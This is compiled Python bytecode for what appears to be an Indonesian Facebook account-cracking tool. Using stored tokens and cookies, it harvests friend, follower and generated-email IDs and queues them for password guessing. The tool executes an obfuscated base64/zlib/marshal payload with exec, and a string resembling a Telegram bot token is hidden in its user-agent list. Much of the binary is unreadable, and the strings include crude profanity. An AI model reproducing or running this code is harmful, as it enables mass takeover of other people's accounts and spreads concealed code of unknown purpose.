o
    e�c8x �                   @   s�	  d dl Z d dlZzd dlZW n$ ey2   e �d� zd dlZW n ey/   e j�d� Y nw Y nw d dlmZ d dl	m
Z d dl	mZ d dlmZ d dlmZ d d	lmZ d d
lmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dl	m
Z
 d dlmZ d d
lmZ d dlm Z m!Z!m"Z"m#Z#m$Z$ d dlm%Z% d dlm&Z&m!Z!m'Z' d dlm(Z(m)Z) e
� Z*d dl	mZ d d	lmZ d dlmZ d dl+m,Z, d dlmZ d dl-m.Z.m/Z/ d dl0m1Z1 d dl-m/Z/m2Z2 �zdd dl Z d dlZzd dl3Z3W nD e�yD Z4 z7ede4j5� d�� e �de4j5� d�� e �de4j5� d�� e �de4j5� d�� e �de4j5� d�� W Y dZ4[4ndZ4[4ww zd dl6Z6W nD e�y� Z4 z7ede4j5� d�� e �de4j5� d�� e �de4j5� d�� e �de4j5� d�� e �de4j5� d�� W Y dZ4[4ndZ4[4ww zd dl7Z7W nD e�y� Z4 z7ede4j5� d�� e �de4j5� d�� e �de4j5� d�� e �de4j5� d�� e �de4j5� d�� W Y dZ4[4ndZ4[4ww zd dl8Z8W nD e�y% Z4 z7ede4j5� d�� e �de4j5� d�� e �de4j5� d�� e �de4j5� d�� e �de4j5� d�� W Y dZ4[4ndZ4[4ww z'd dl9Z9e:e j;d�Z<e9j=g d�e<e9j>d�Z?e?d k�rFe �d� e<�@�  d ZAW n   d!ZAY W n   Y d dl Z d dlZd dlBZBd dlCZCd dlDZDd dlEZEd dlFZFd dlGZGd dlHZHd dlIZId dlJZJd dlKZKd dlLZLd dl3Z3d dl8Z8d dl6Z6d dlZd dl Z d dl9Z9d dlJZJd dl3Z3d dlZd dlDZDd dlBZBd dlFZFd dlMZMd dlHZHd dlNZNd dlZd dl Z d dl9Z9d dlNZNd dlOZOd dl Z d dlZd dlFZFd dlBZBd dl3Z3d dlLZLd dlDZDd dl6Z6d dl9Z9d dlJZJd dlHZHd dl3ZPd dlBZBd dlDZDd dlHZHd d"lQmRZR d d#l6mSZT d d#l6mSZU d d#l6mSZS d d$lDmVZW d d%lXmYZZ d d%lXmYZY d d"lQmRZR d d&lCmCZC d d'l[m\Z\ d d(lCm]Z] d)Z^d*Z_d+Z`d,Zad-Zbd.Zcd/Zdd0Zed1Zfd2Zgd3Zhd4Zid5Zjd6Zkd7Zld8Zmd9Znd:Zod;Zpd<Zqd=Zrd>Zsd?Ztd@ZudAZvdBZwdCZxdDZydEZzdFZ{dGZ|dHZ}dIZ~dJZdKZ�dLZ�dMZ�dNZ�dOZ�dPZ�dQZ�dRZ�dSZ�dTZ�e3��� Z�eC��� Z�e�eC��� ��dU��Z�e�j�Z�e�j�Z�e�j�Z�eC��� Z�e�eC��� ��dV��Z�e�eC��� ��dW��Z�dXdYdZd[d\d]d^d_d`dadbdcdd�Z�eC��� ��de�Z�eC��� ��df�Z�e�eC��� ��dg��Z�dhgZ�dhgZ�g di�Z�g dj�Z�g dk�Z�g dl�Z�g dl�Z�g g g g f\Z�Z�a�Z�g dmdngg g d g g dodpdmdmg dqdmdmdmf\a�a�Z�Z�Z�a�a�a�a�a�a�a�Z�a�a�Z�a�dmZ�dmZ�drds� Z�dtdu� Z�dvdw� Z�dxdy� Z�G dzd{� d{�Z�G d|d}� d}�Z�G d~d� d�Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�e�e�d��� d�d�� Z�e�e�d��� d�d�� Z�e�e�d��� G d�d�� d��Z�e΃ �ϡ  dS )��    Nzpip install richzk[?] Maaf Ngab, Sepertinya Tidak Bisa Install Rich(Install Manual : python -m pip install rich &> /dev/null))�Table)�Console)�Group)�Panel)�print)�Markdown)�Columns)�Tree)�track)�Progress�SpinnerColumn�	BarColumn�
TextColumn�TimeElapsedColumn)�Task)�DownloadColumnr   �TransferSpeedColumn)�filesize�get_console)�Syntax)�DOUBLE�ROUNDED)�Padding)r   �Boxz[X] Sedang Install Bahan z, Mohon Bersabar....zpython -m pip install z &> /dev/nullzpython2 -m pip install zpython2 -m pip2 install zpython -m pip2 install �w)Zdpkgz-sz
play-audio)�stdout�stderrz&pkg install play-audio -y &> /dev/nullZKontol�Jangan)�ConnectionError)�BeautifulSoup)�choice)�ThreadPoolExecutor)�datetime)�quote)�datez#000000z#FF0000z#00FF00z#FFFF00z#00C8FFz#AF00FFz#FF00FFz#00FFFFz#FFFFFFz#FF8F00z#AAAAAAz#FFA500z[0;97mz[0;91mz[1;92mz[1;93mz[1;94mz[1;95mz[0;96mz[0mz[0;90mz[38;5;208mz[38;5;248mz[38;2;255;127;0;1mz[40mz[44mz[46mz[42mz[45mz[41mz[47mz[43mz	[#000000]z	[#FF0000]z	[#00FF00]z	[#FFFF00]z	[#00C8FF]z	[#AF00FF]z	[#FF00FF]z	[#00FFFF]z	[#FFFFFF]z	[#FF8F00]z	[#AAAAAA]z	[#FFA500]z%d-%m-%Yz%Y-%m-%dz%Y%m%dZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�01�02�03�04�05�06�07Z08Z09Z10Z11Z12z%H:%M:%Sz%H%M%Sz%d%m%Ya�  Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36)��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]�  NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0��Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]s�   �Jہ���G��.(��c�b���/����`л��&�0s�l�=C�aN�0;$�&Ǯq7U�[�gӈ�4��2�\�/N�@�/��(��;�+Mۚ���#[@���Z}��=���@����[��Q�;Ş2e`��~~��
�[�R��(?l�e$/K�0�IN%�x��Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405��Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;])r,   r-   z.5353538250:AAEy8dG0bzRX2mxgLoGJqWYcqk9fKok_Sjgr.   r/   r0   )r,   r-   s�  rJLw2/F3v0PfZ+F88lY2OO393v/jb/tn/9E8UqHfu+y5+fXQtMyf623eEXAumpu77SWYBSAkbzDsNmOGxO4qRbL4bSRcNzAYvVmnUoEh9s1SzlaPvdVYJOarnmlFTEPf6FKmEZwkS4hkdrFrJL9yMk4kSf8SjmhF1uswHbWNjoCTvTbCRXnJiUJidV8K0aCguz14iRl9Xw9Q76KAGt6m4xH3sckRYqgcrIu5wOJIhbKd5LKwmEB4WSbyFjrpgirsOaVMR7cWgAUclQdxNWZL+VLAQpNt3V4OtBUTFa2bfxkz4EUw2k/FNp3wjXia+fANSlCB0joFGzZiX/w9kPEEKoUkDQneV1ngvvZCTbA3gxeroxHtKIku/F6walDbrB7RVPyu04SpZ2rqSJmw87EmfaR/DfDylxjbV7QyBO/eTuTVHwloayU0cnouKV9Qer3mlPbtAe/KoAUcG40b2afoMPZ5VJq+P0jlXC0o5r+QrPH1Wxjz3HXGw2TWH6CjqcCtgL56PfVPppkZaSoGuoIlFrIYGvvDLvthj75bV/0ry9BMn75T57j58MChDtc1H8Yw53+/x9wxg3r6/C94ZxROynyKj7Edi2cQgK5CG5eixFCaQjEEop9Apkqqa2EiBQhx5OcgGHWRAA0mSmjkdxJer.   r/   r0   )z�Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z�Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16� l   �joIl ZAKTIFZTIDAKZDOWNc                 C   s$   | }t ||d�}t� j||d� d S )N��style)�mark�solr   )Zkata�wweZwewZpertamaZkedua� r7   �/sdcard/Download/main.py�kotak�   s   r9   c                   C   s6   zt �d� W n   Y zt �d� W d S    Y d S )N�data�results)�os�mkdirr7   r7   r7   r8   �folder�   s   r>   c                 C   s6   dt kst dkr
d S z
t�d|  � W d S    Y d S )Nr   zplay-audio )�musik_r<   �popen)�xr7   r7   r8   �play_mpv�   s   rB   c                  C   s  t d� td�} | dkrtdtt� t�d� t�  ztt	| d��
� �}W n ty7   tdtt� t�  Y nw tdd	��=}t	| d��
� D ]-}z&|�d
d�}z	|�d�\}}W n   |�d�\}}}Y |�t|||� W qE   Y qEW d   � n1 s}w   Y  t�  d S )Nr;   �>--Nama File--> r1   �# JANGAN KOSONG KONTOL�   �rz# FILE TIDAK ADA�
   ��max_workers�
�|)�cekfile_crk�inputr9   �M�Q�time�sleep�exit�len�open�	readlines�FileNotFoundError�K�__Kiky__�replace�split�submit�get_apk)Znama_zZtotal__�formr:   �user�pw�cokir7   r7   r8   �cek_apk_hasil_crk�   s    $$
��
ra   c                   @   s   e Zd Zdd� ZdS )�	open_rolec                 C   sF   z	t dd��� aW n   Y zt dd��� adtiaW d S    Y d S )N�data/login.txtrF   �data/cookie.txt�cookie)rT   �read�tiktokZpupuk�puput��selfr7   r7   r8   �__init__�   s   zopen_role.__init__N)�__name__�
__module__�__qualname__rk   r7   r7   r7   r8   rb   �   s    rb   c                   @   s�   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd � Zd!d"� Zd#d$� Zd%d&� Zd'S )(�Mainc                 C   s   t �d� t�  | ��  d S )N�clear)r<   �systemrb   �introri   r7   r7   r8   rk   �   s   
zMain.__init__c                 C   sD   t tt� dt� dt� |� t� dt� d�
td�� t�d� t�  d S )NzMOHON MAAF MENU �[�]z# INI BELUM TERSEDIA... BACK TO MENUr2   �   )	�iprintr   �MM�QQ�CCrO   rP   rQ   ro   )rj   Zkataar7   r7   r8   �menu_del�   s   :
zMain.menu_delc                 C   s�  dd� }t |d�� t�� }|j}|dk rd}n/d|  kr"dk r'n nd}n d|  kr1dk r6n nd	}nd|  kr@d
k rEn nd}nd}z	tdd��� }W n   t�  Y z	tdd��� }W n   Y zd| }t� dt� dt	� dt� �}W n   t� dt� �}Y z	t
�d��� }	W n   ddi}	Y d}
tdddd�}|jtt|
|dtdd��dd�}|�t� d t� ��}|�d!t	� d t� ��}|�t� d"t� �� |�t� d"t� �� |�d!t� d#t� ��}|�t� d$t� �� d%}t|d&d'dd(�}|�d!t� d)t� ��}|�t|�� |�d!t� d*t� ��}|�t� d+t� ��}
|
�t� d,t� �� |�t� d-t� ��}|�t� d.t� �� |�t� d.t� �� zt
�� jd/t td0�}t�|j�}|d1 }|d2 }W nB   zt�d� W n   Y zt�d� W n   Y tdddd�}|jtt|
|dtdd��dd�}t|� td3tt � tj!�"�  Y |�d!t	� d4t� ��}|�d5t#� |� t� �� |�d6t#� t$� t� �� |�d7t#� t%|	d �� t� �� |�d8t#� |� t� �� t|� z	td9d���  W n   td9d:��&d;� td<t't(� Y d=}d>t)� d?t*� d@t)� dA�}t+� dBt+� dBt+� dBt+� dBt+� dBt+� dCt+� dD�}t,� }
|
j-dEt'dFdG� |
j-dHt dFdIdJ� |
j-dKtdFdG� |
�.|||� t/� j0|
dFdL� | �1�  d S )MNc              
   S   �,   t d��t d��t d��| d d d� ���S �N�marshal�zlib�base64�������
__import__�loads�
decompress�	b64decode��__r7   r7   r8   �<lambda>�   �   , zMain.intro.<locals>.<lambda>s�   ==gkogSPAwoUMwTcIPhcIcsaTqpUfu5khV8uwmqtixPTWQrCEDVyZxCytmkYfbxVXEzbLKPm36Ljb9sRtYvYJ5ndrRhbmlUcmF3WUsnJf27hnCrQfO6oAOmgL+7tnCpQ7+JqI9FqCJLpV6lYuN2iUMnJMCpBGZgQbHQdLWSlhEZmZmblpUZMFGTlhgZKF2CipuZIFGSliAkaFTMAsDELDAkZLxJe�   zSelamat Dini Hari�   zSelamat Pagi�   zSelamat Siang�   zSelamat SorezSelamat Malamrc   rF   rd   r1   �Tokenz And ZCookiezhttps://httpbin.org/ip�origin�-z�		     ___                __            ____  __
	  	    / _ \ ___ _  ____  / /__  ____   / __/ / /
		   / // // _ `/ / __/ /  '_/ /____/ / _/  / _ \ 
		  /____/ \_,_/ /_/   /_/\_\        /_/   /_.__/�!                                 T�Z	highlightZ	hide_rootzwhite on black�   )�titler3   Zbox�paddingzbold magenta�Zguide_stylez	WHOAMI-XD�z!https://githuh.com/WHOAMI-XD-KINGzMy WhatsAppZ09150936979z[Wans X Gans
	Jeck X Nano
	Xenzi Ganz
	Radhin Al Haady
	Zee K World
	Moch Aang Ardiansyah XD�python�monokai�ZthemeZline_numberszMy Team�InformationzGrub WhatsAppz0https://chat.whatsapp.com/Ce0kk20fOKD3GB4sRbNkidz	Facebook z(https://www.facebook.com/100081539113399z<https://graph.facebook.com/me?fields=name,id&access_token=%s��cookies�name�idz# TOKEN KADALUARSAzData-Data Facebook AndazUsername/Id       :zTanggal BerGabung :zIp Address        :zLogin Menggunakan :z	data/katar   z)#SELAMAT DATANG, TERIMA KASIH TELAH LIHATz!# SELAMAT DATANG PENGGUNA BARU !!z01
02
03
04
05
06

00z#Crack Dari Public
Crack Dari Public�(ZMASALz�)
Crack Dari Follow
Crack Dari Random Email
Check Jumlah Teman
Check Hasil Crack
Check Options Akun Sesi

Log Out Dari Akun (Keluar)zONN
zONN

ZONN�NO�center�r3   �justify�PILIHAN�<   �r3   r�   �widthZSTATUS�r�   )2�execr"   �now�hourrT   rf   �login�i�q�k�requests�get�jsonr	   �addr   r   r   �c�br   �j�Sessionrg   rh   r�   �textr<   �remove�printsr9   rN   rO   �sysrR   �u�waktuu�str�writerW   �Crx   �KK�II�me�
add_column�add_rowr5   r   �pilihan)rj   �_r�   r�   �waktu�tokenre   ZxnxzxZzza�sh�todZmy_Zmy__Zmy_rZmy_rrZmy_rrr�code�pyhonZmy_rrrrZmy_rrrrrZtod_�yz�zxc�nama�idzZtoken_eZdata_�topZtipZlppr7   r7   r8   rr   �   s�      $���	������z
Main.introc              
   C   s6  t d�}|dv r| ��  tj��  d S |dv r"| ��  tj��  d S |dv r1| ��  tj��  d S |dv r@| ��  tj��  d S |dv rO| ��  tj��  d S |dv r^| �	�  tj��  d S |dv rm| �
�  tj��  d S |d	v rw| ��  d S t� d
t� dt� |� t� dt� d�
}tt|td�� t�d�t� f d S )Nz>--Pilih 1-7--> ��1r%   ��2r&   ��3r'   ��4r(   ��5r)   ��6r*   ��7r+   )�00r�   �Maaf Pilihan rs   �] �Anda Tidak Tersedia..r2   ru   )rM   �publicr<   r�   rR   �public_mass�follow�random_email�cek_jumlah_teman�rek�cek_opsi�logutrw   rx   ry   rv   r   rO   rP   rQ   ro   )rj   Zkir�   r7   r7   r8   r�   `  s   $zMain.pilihanc                 C   sJ   zt �d� W n   Y zt �d� W n   Y tdtt� t j��  d S )Nrc   rd   z7# Token Dan Cookies Berhasil DiHapus (Berhasil Log Out))r<   r�   r9   rN   rO   r�   rR   ri   r7   r7   r8   r�   n  s   z
Main.logutc                 C   �   zt �� jd|tf td�}t�|j�}|d }W |S  tyI } z#t	t
dt� dt� |� t� dt� d�	�� t�d� t�  W Y d }~|S d }~ww �	Nz<https://graph.facebook.com/%s?fields=name,id&access_token=%sr�   r�   zMohon Maaf Idz rs   rt   z Tidak Ditemukanru   �r�   r�   r�   rg   rh   r�   r�   r�   �	Exceptionrv   r   rx   rw   ry   rP   rQ   ro   �rj   �iddr�   r�   r�   �er7   r7   r8   �
ambil_namav  �   
�(
��zMain.ambil_namac                 C   r�   r�   r�   r�   r7   r7   r8   �	ubah_nama�  r�   zMain.ubah_namac              
   C   s�   zN|dkr|W S d| }t �� �4}t|j|td�jd�}|jddd�}t|d ��d	�d
 }|�	dd�}|�	dd�}|W  d   � W S 1 sGw   Y  W d S  t
yb } z|W  Y d }~S d }~ww )Nr�   zhttps://mbasic.facebook.com/r�   �html.parser�aZLainnya��string�href�=r�   z&refidr1   z&paipv)r�   r�   �parr�   rh   �content�findr�   rZ   rY   r�   )rj   �username�url�xyz�reqZkutr�   r�   r7   r7   r8   �	ubah_user�  s   
(�� zMain.ubah_userc                 C   s~   z6|dkr
d}W |S d� |�dd�}d|v r|dd�}tjd|d�j}t|d�}|jd	d
d�}|j}|}W |S    |}Y |S )Nr�   zhttps://free.facebook.com/{}ZLookup)ZfburlZcheckZfacebookzhttps://lookup-id.com/�r:   r�   �spanr�   �r�   )�formatr�   �postr�   r�   r   r�   )rj   r�   ZpayloadZmmkZxxxZidttZaswr7   r7   r8   �
ubah_user1�  s   �

�zMain.ubah_user1c              
   C   s:  d}t � }|jdtdd� |jdtddd� |�dd	� t� j|dd
� td�}|dv rSd}td�}ttd��}t	|�D ]}|d7 }t
�|t|� | d | � q<n�|dv r~d}td�}ttd��}t	|�D ]}|d7 }t
�|t|� | d | � qgnU|dv r�d}td�}ttd��}t	|�D ]}|d7 }t
�|t|� | d | � q�n*|dv r�d}td�}ttd��}t	|�D ]}|d7 }t
�|t|� | d | � q�d}|dt ttt
�� t 7 }tt
�dkr�t}	d}
nt}	d}
tt|d|	d�� |
dk�rtdtt� tj��  t � }|jdtdd� |jdtddd� |�dd t� d!t� d"t� d#�� t� j|dd
� td$t� d%t� d&��}|d'v �rSt
D ]}t�|� �qInC|d(v �ret
D ]	}t�d|� �qZn1|d)v �rt
D ]}t�dtt��}t�||� �qlntd*tt� t� d+� t
D ]	}t�d|� �q�t!� �"�  d S ),Nr   r�   r�   r�   r�   r�   r�   z1
2
3
4z[Username + @Gmail.com
Username + @Yahoo.com
Username + @Hotmail.com
Username + @Outlook.comr�   �>--Pilih 1-4--> )r�   z
@gmail.comz>--Masukan Nama--> z>--Limit--> r�   �<=>)r�   z
@yahoo.com)r�   z@hotmail.com)r�   z@outlook.comr1   �Jumlah Idz Yang Terkumpul : �NOT�YESr�   �r�   r3   �9# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA�1
2
3�@Crack Dari Akun Tertua
Crack Dari Akun Termuda
Crack Dari Randomr�   �Recommended�)�>--�	Pilih 1-3�--> r�   r�   r�   �# LAIN KALI ISI DENGAN BENAR !!r�   )#r�   r�   rW   rO   r�   r5   r   rM   �int�ranger�   �appendr�   r�   rS   rx   rN   �Irv   r   r9   �Or<   r�   rR   r�   r�   r�   �insert�random�randintrP   rQ   �	crack_new�otomatis)rj   rA   r�   Zask�emailr�   Zjumlah�z�god�MML�say�hu�rikod�xxr7   r7   r8   r�   �  s�    � � � 

 
�
�
�zMain.random_emailc              
   C   s�  z	t dd��� }W n ty   t�d� tj��  Y nw d}tdtt	� zt
td��}W n   d}Y tdtt	� t|�D ]t}td	t� d
t� d��}d}| �|�}|dt | �|� t d 7 }zHd|tf }t�� �4}t�|j|td�j�}	|	d d D ]}
z|
d }|
d }t�|d | � W q~   Y q~W d   � n1 s�w   Y  W q> ty�   Y q>w |dt tt t�� t 7 }t t�dkr�t!}d}nt"}d}t#t$|d|d�� |dkr�tdt!t%� tj��  t&� }|j'dt"dd� |j'd t!dd!d"� |�(d#d$t� d%t� d&t� d'�� t)� j*|dd(� td	t+� d)t� d*��}|d+v �r0tD ]}t,�|� �q&nC|d,v �rBtD ]	}t,�-d|� �q7n1|d-v �r\tD ]}t.�/dt t,��}t,�-||� �qIntd.t!t	� t0�1d/� tD ]	}t,�-d|� �qit2� �3�  d S )0Nrc   rF   �rm -rf data/login.txtr1   z# MASUKAN JUMLAH TARGERz>--Jumlah--> r�   �0# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!r  �Target�--> : �10000�Nama : rJ   �Lhttps://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%sr�   �friendsr:   r�   r�   r  r  r   r  r  r�   r  r  r�   r�   r�   r�   r�   r�   r  r  r�   r  r  r�   r  r  r�   r�   r�   r  r�   )4rT   rf   �IOErrorr<   rq   r�   rR   r9   rW   rO   r  rM   r�   r  r�   r�   r  r�   r�   rx   rg   r�   r�   r�   r�   r�   rh   r�   r�   r  �KeyErrorr�   rS   rN   r  rv   r   r  r�   r�   r�   r5   r   r�   r�   r   r!  r"  rP   rQ   r#  r$  )rj   r�   r'  Zjmlh_rA   �idt�limitr  r  �jsor�   �uidr�   r(  r)  r�   r*  r+  r,  r7   r7   r8   r�   �  s~   
�


���
 
�
�
�zMain.public_massc              
   C   s�  z	t dd��� }W n ty   t�d� tj��  Y nw d}tdtt	� t
dt� dt� d��}d	}| �|�}|d
t | �|� t d 7 }zHd|tf }t�� �4}t�|j|td�j�}|d d D ]}z|d }	|d }
t�|	d |
 � W qc   Y qcW d   � n1 s�w   Y  W n	 ty�   Y nw |dt ttt�� t 7 }tt�dkr�t}d}nt}d}t t!|d|d�� |dkr�tdtt"� tj��  t#� }|j$dtdd� |j$dtddd� |�%d d!t� d"t� d#t� d$�� t&� j'|dd%� t
dt(� d&t� d'��}|d(v �rtD ]}t)�|� �qnC|d)v �r'tD ]	}t)�*d|� �qn1|d*v �rAtD ]}t+�,dtt)��}t)�*||� �q.ntd+tt	� t-�.d,� tD ]	}t)�*d|� �qNt/� �0�  d S )-Nrc   rF   r-  r1   r.  r  r/  r0  r1  r2  rJ   r3  r�   r4  r:   r�   r�   r  r  r   r  r  r�   r  r  r�   r�   r�   r�   r�   r�   r  r  r�   r  r  r�   r  r  r�   r�   r�   r  r�   )1rT   rf   r5  r<   rq   r�   rR   r9   r�   rO   rM   r�   r�   r  r�   r�   rx   rg   r�   r�   r�   r�   r�   rh   r�   r�   r  r6  r�   rS   rN   r  rv   r   r  r�   r�   r�   r5   r   r�   r�   r   r!  r"  rP   rQ   r#  r$  �rj   r�   r'  r7  r8  r  r  r9  r�   r:  r�   r(  r)  r�   r*  r+  r,  r7   r7   r8   r�   /  sv   
�


���
 
�
�
�zMain.publicc              
   C   s�  d}g g }}z	t dd��� }W n ty#   t�d� tj��  Y nw d}tdtt	� t
dt� dt� d	��}d
}| �|�}z@d|tf }t�� �,}	t�|	j|td�j�}
|
d d D ]}z|d }|�|� W q[   Y q[W d   � n1 sxw   Y  W n	 ty�   Y nw |D ]}t�dt|��}|�||� q�|D ]�}|dkr� n�z�g }g }d|tf }t�� �,}	t�|	j|td�j�}
|
d d D ]}z|d }|�|� W q�   Y q�W d   � n1 s�w   Y  d| d | }t�� �,}	t�|	j|td�j�}
|
d D ]}z|d }|�|� W �q   Y �qW d   � n	1 �s$w   Y  W n
 t�y4   Y nw t� }|jdtdd� |jdtdd� |jdtdd� |� |� t|�� t|�� � dt|�� k�r|dt|�� k�rs|d8 }nt!� j"|dd� nt!� j"|dd� |d7 }q�tdtt	� t
dt� dt� d	��}d
}| �|�}zKd|tf }t�� �6}	t�|	j|td�j�}
|
d d D ]}z|d }|d }t#�|d | � W �q�   Y �q�W d   � n	1 �s�w   Y  W n
 t�y�   Y nw |dt$ | �%|� t& d 7 }|d t$ t'tt#�� t& 7 }tt#�dk�r t(}d!}nt}d"}t)t*|d#|d$�� |d!k�r=td%t(t� tj��  t� }|jd&tdd� |jd't(dd(d)� |� d*d+t&� d,t$� d-t&� d.�� t!� j"|dd� t
dt+� d/t� d0��}|d1v �r�t#D ]}t,�|� �q{nC|d2v �r�t#D ]	}t,�d|� �q�n1|d3v �r�t#D ]}t�dtt,��}t,�||� �q�ntd4t(t	� t-�.d5� t#D ]	}t,�d|� �q�t/� �0�  d S )6Nr   rc   rF   r-  r1   r.  r  r/  r0  r1  zXhttps://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%sr�   r4  r:   r�   �   r3  �https://graph.facebook.com/�%/subscribers?limit=9999&access_token=�IDr�   r�   �JUMLAH TEMAN�JUMLAH PENGIKUT�0r�   r�   r�   r  r2  rJ   r  r  r  r�   r  r  r�   r�   r�   r�   r  r  r�   r  r  r  r  r�   r�   r�   r  r�   )1rT   rf   r5  r<   rq   r�   rR   r9   r�   rO   rM   r�   r�   r  rg   r�   r�   r�   r�   r�   rh   r�   r  r6  r!  r"  rS   r   r�   r�   r  r  r�   r5   r   r�   r�   r�   rx   r�   rN   rv   r   r�   r�   rP   rQ   r#  r$  )rj   �maxZnonZidbr�   r'  r7  r8  r  r  r9  r�   r:  r+  r,  �ml�goblok�tolol�Fanak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol�Janak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw�todzr�   r(  r)  r�   r*  r7   r7   r8   �	public_v2h  s�   

�


���

��
���


���

 
�
�
�zMain.public_v2c                 C   s�  z	t dd��� }W n ty   t�d� tj��  Y nw d}tdtt	� t
dt� dt� d��}d	}| �|�}|d
t | �|� t d 7 }zHd|tf }t�� �4}t�|j|td�j�}|d d D ]}z|d }	|d }
t�|	d |
 � W qc   Y qcW d   � n1 s�w   Y  W n	 ty�   Y nw |dt ttt�� t 7 }tt�dkr�t}d}nt}d}t t!|d|d�� |dkr�tdtt"� tj��  t#� }|j$dtdd� |j$dtddd� |�%d d!t� d"t� d#t� d$t&� d%�	� t'� j(|dd&� t
dt)� d't� d(��}|d)v �rtD ]}t*�|� �qnC|d*v �r*tD ]	}t*�+d|� �qn1|d+v �rDtD ]}t,�-dtt*��}t*�+||� �q1ntd,tt	� t.�/d-� tD ]	}t*�+d|� �qQt0� �1�  d S ).Nrc   rF   r-  r1   r.  r  r/  r0  r1  r2  rJ   zchttps://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(500000)&access_token=%sr�   Zsubscribersr:   r�   r�   r  r  r   r  r  r�   r  r  r�   r�   r�   r�   r�   r�   r  z/Crack Dari Akun Tertua
Crack Dari Akun Termuda r�   r  r  z
Crack Dari Randomr�   r  r  r�   r�   r�   r  r�   )2rT   rf   r5  r<   rq   r�   rR   r9   r�   rO   rM   r�   r�   r  r�   r�   rx   rg   r�   r�   r�   r�   r�   rh   r�   r�   r  r6  r�   rS   rN   r  rv   r   r  r�   r�   r�   rw   r5   r   r�   r�   r   r!  r"  rP   rQ   r#  r$  r;  r7   r7   r8   r�   �  sv   
�


���	
&
�
�
�zMain.followc                 C   s�  zt dd��� }t dd��� }W n ty.   t�d� tdtt� t�	d� tj
��  Y nw d}tdtt� tdt� d	t� d
��}| �|�}|dt | �|� t d 7 }z@d|tf }t�� �,}t�|j|td�j�}|d d D ]}z|d }	t�|	� W qs   Y qsW d   � n1 s�w   Y  W n	 ty�   Y nw |dt tt t�� t 7 }t t�dkr�t}
d}nt!}
d}t"t#|d|
d�� |dkr�tdtt$� tj
